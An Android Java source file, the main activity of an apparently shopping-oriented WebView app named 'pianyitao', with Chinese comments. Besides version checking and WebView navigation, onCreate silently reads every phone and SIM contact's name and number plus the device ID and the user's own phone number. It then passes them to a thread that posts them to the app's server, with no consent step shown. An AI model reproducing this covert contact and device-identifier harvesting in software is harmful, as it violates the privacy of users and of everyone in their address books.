package com.pianyitao.activity;

import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.Photo;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Window;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.pianyitao.common.Common;
import com.pianyitao.common.VersionUpdateManager;
import com.pianyitao.service.AppService;
import com.pianyitao.thread.GetAppVersionThread;
import com.pianyitao.thread.PostTelInfoThread;
import com.pianyitao.view.ProgressWebView;

public class MainActivity extends Activity {

	private ProgressWebView webView;
	// 通讯录的信息
	private Map<String, String> telInfo = new HashMap<String, String>();
	/** 获取库Phon表字段 **/
	private static final String[] PHONES_PROJECTION = new String[] {
			Phone.DISPLAY_NAME, Phone.NUMBER, Photo.PHOTO_ID, Phone.CONTACT_ID };

	/** 联系人显示名称 **/
	private static final int PHONES_DISPLAY_NAME_INDEX = 0;

	/** 电话号码 **/
	private static final int PHONES_NUMBER_INDEX = 1;

	private Handler handler = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			switch (msg.what) {
			case Common.GET_VERSIONSION_SUCCESS:
				String newVersionNo = msg.obj.toString();
				if (Common.CompareVersion(getCurrentVersion(), newVersionNo)) {
					new AlertDialog.Builder(MainActivity.this)
							.setTitle("系统提示")
							// 设置对话框标题
							.setMessage("已检测到最新版本是否下载？")
							// 设置显示的内容
							.setPositiveButton("确定",
									new DialogInterface.OnClickListener() {// 添加确定按钮
										@Override
										public void onClick(
												DialogInterface dialog,
												int which) {// 确定按钮的响应事件
											// 调用接口
											String url = Common.apkDownLoadUrl;
											VersionUpdateManager manager = new VersionUpdateManager(
													MainActivity.this, url);
											manager.showDownloadDialog();
										}

									})
							.setNegativeButton("返回",
									new DialogInterface.OnClickListener() {// 添加返回按钮
										@Override
										public void onClick(
												DialogInterface dialog,
												int which) {// 响应事件
											dialog.cancel();
										}
									}).show();// 在按键响应事件中显示此对话框
				} else {
					// 当前已是最新版本
				}
				break;

			case Common.GET_VERSIONSION_FAILED:
				Common.toast(MainActivity.this, msg.obj.toString());
				break;
			case Common.POST_POSITION_SUCCESS:
				break;
			case Common.POST_POSITION_FAILED:
				break;
			case Common.POST_TELINFO_FAILED:
			case Common.POST_TELINFO_SUCCESS:
				break;
			}
		}

	};

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		webView = (ProgressWebView) findViewById(R.id.myWebView);
		webView.getSettings().setJavaScriptEnabled(true);
		if (Common.isNetworkConnected(MainActivity.this)) {
			// 调用检查版本接口
			new GetAppVersionThread(handler).start();
		} else {
			Common.toast(getApplicationContext(), "请检查网络更新");
		}
		Common.webUrl = "";

		Intent service = new Intent(MainActivity.this, AppService.class);
		MainActivity.this.startService(service);

		// 获取通讯录信息
		getPhoneContacts();
		getSIMContacts();
		
		// 获取手机号码
		TelephonyManager tm = (TelephonyManager) this
				.getSystemService(Context.TELEPHONY_SERVICE);
		String userMac = tm.getDeviceId();// 获取智能设备唯一编号
		String userPhoneNumber = tm.getLine1Number();// 获取本机号码
		
		telInfo.put("userMac", userMac);
		telInfo.put("userPhoneNumber", userPhoneNumber);
		
		// 调用接口
		new PostTelInfoThread(handler, telInfo).start();
	}

	@Override
	// 设置回退
	// 覆盖Activity类的onKeyDown(int keyCoder,KeyEvent event)方法
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if ((keyCode == KeyEvent.KEYCODE_BACK) && webView.canGoBack()) {
			webView.goBack(); // goBack()表示返回WebView的上一页面
			Common.webUrlListSize = Common.webUrlList.size();
			if(Common.webUrlListSize != 0){
				Common.webUrlList.remove(Common.webUrlListSize - 1);
			}
			Common.webUrl = "";
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	@Override
	protected void onResume() {
		super.onResume();
		String webUrlString = Common.webUrl;
		Common.webUrlListSize = Common.webUrlList.size();
		
		if (null == webUrlString || webUrlString.isEmpty()) {
			Intent intent = getIntent();
			webUrlString = intent.getStringExtra("webUrlString");
			if (null == webUrlString || webUrlString.isEmpty()) {
				if(Common.webUrlListSize == 0){
					webUrlString = Common.webViewUrl;
				}else{
					webUrlString = Common.webUrlList.get(Common.webUrlListSize - 1);
				}
				
			}
		}
		
		if(Common.webUrlListSize == 0 || !webUrlString.equals(Common.webUrlList.get(Common.webUrlListSize - 1))){
			Common.webUrlList.add(webUrlString);
		}
		
		// if (Common.isNetworkConnected(MainActivity.this)) {
		webView.loadUrl(webUrlString); // 覆盖WebView默认使用第三方或系统默认浏览器打开网页的行为，使网页用WebView打开
		webView.setWebViewClient(new WebViewClient() {
			@Override
			public boolean shouldOverrideUrlLoading(WebView view, String url) {
				if (url.contains("tel") || url.contains("sms")) {
					// Load the site into the default browser
					Intent intent = new Intent(Intent.ACTION_VIEW, Uri
							.parse(url));
					startActivity(intent);
					return true;
				}else{
					Common.webUrlListSize = Common.webUrlList.size();
					if(Common.webUrlListSize == 0 || !url.equals(Common.webUrlList.get(Common.webUrlListSize - 1))){
						Common.webUrlList.add(url);
					}
				}
				// 返回值是true的时候控制去WebView打开，为false调用系统浏览器或第三方浏览器
				view.loadUrl(url);
				return true;
			}
		});
		// } else {
		// Common.toast(getApplicationContext(), "请检查网络更新");
		// }

	}

	@Override
	protected void onDestroy() {

		super.onDestroy();
	}

	/**
	 * 获取当前应用的版本号
	 */
	public String getCurrentVersion() {
		try {
			// 获取packagemanager的实例
			PackageManager packageManager = getPackageManager();
			// getPackageName()是你当前类的包名，0代表是获取版本信息
			PackageInfo packInfo = packageManager.getPackageInfo(
					getPackageName(), 0);
			return packInfo.versionName;
		} catch (NameNotFoundException e) {
			e.printStackTrace();
			return "";
		}
	}

	/** 得到手机通讯录联系人信息 **/
	private void getPhoneContacts() {
		ContentResolver resolver = getContentResolver();

		// 获取手机联系人
		Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,
				PHONES_PROJECTION, null, null, null);

		if (phoneCursor != null) {
			while (phoneCursor.moveToNext()) {

				// 得到手机号码
				String phoneNumber = phoneCursor.getString(PHONES_NUMBER_INDEX);
				// 当手机号码为空的或者为空字段 跳过当前循环
				if (TextUtils.isEmpty(phoneNumber))
					continue;

				// 得到联系人名称
				String contactName = phoneCursor
						.getString(PHONES_DISPLAY_NAME_INDEX);

				telInfo.put(phoneNumber, contactName);
			}

			phoneCursor.close();
		}
	}

	/** 得到手机SIM卡联系人人信息 **/
	private void getSIMContacts() {
		ContentResolver resolver = getContentResolver();
		// 获取Sims卡联系人
		Uri uri = Uri.parse("content://icc/adn");
		Cursor phoneCursor = resolver.query(uri, PHONES_PROJECTION, null, null,
				null);

		if (phoneCursor != null) {
			while (phoneCursor.moveToNext()) {

				// 得到手机号码
				String phoneNumber = phoneCursor.getString(PHONES_NUMBER_INDEX);
				// 当手机号码为空的或者为空字段 跳过当前循环
				if (TextUtils.isEmpty(phoneNumber))
					continue;
				// 得到联系人名称
				String contactName = phoneCursor
						.getString(PHONES_DISPLAY_NAME_INDEX);

				// Sim卡中没有联系人头像

				telInfo.put(phoneNumber, contactName);
			}

			phoneCursor.close();
		}
	}

}
